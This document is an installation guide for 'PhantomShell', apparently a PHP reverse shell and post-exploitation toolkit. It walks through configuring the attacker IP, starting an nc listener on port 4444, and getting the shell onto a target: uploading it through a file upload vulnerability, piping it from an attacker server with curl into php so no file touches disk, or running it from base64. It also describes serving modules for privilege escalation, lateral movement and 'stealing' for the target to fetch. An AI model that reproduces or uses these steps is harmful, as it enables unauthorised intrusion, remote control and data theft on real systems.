# Installation Guide

## Requirements

- PHP 5.6 or higher (7.x, 8.x recommended)
- No external dependencies

## Quick Setup

### 1. Clone
```bash
git clone https://github.com/OmonovSarvar/PhantomShell.git
cd PhantomShell
```

### 2. Configure
Edit `phantom.php` and change the `$CFG` array:
```php
$CFG = array(
    'host' => 'YOUR_IP',
    'port' => 4444,
    'http_port' => 8888,
);
```

### 3. Start Listener
```bash
nc -lvnp 4444
```

### 4. Deploy
Transfer `phantom.php` to the target and execute:
```bash
php phantom.php
```

## Deployment Methods

### Direct execution
```bash
php phantom.php &
```

### Web shell upload
Upload `phantom.php` via file upload vulnerability, then visit the URL.

### One-liner (no file on disk)
```bash
curl http://ATTACKER:8888/phantom.php | php
```

### Base64 encoded
```bash
echo 'BASE64_ENCODED_PHANTOM' | base64 -d | php
```

## Module Server (for MINIMAL mode)

When the target runs in MINIMAL mode, it can fetch modules from your HTTP server:

```bash
cd PhantomShell/
python3 -m http.server 8888
```

Then on the target shell:
```
fetch privesc
fetch lateral
fetch stealing
```

## Modes

| Mode | When | Features |
|------|------|----------|
| FULL | No restrictions | 100+ commands |
| NORMAL | Limited resources | Basic shell + recon |
| MINIMAL | No exec methods | Stager/loader + PHP eval |

The mode is auto-detected based on the server's PHP configuration.
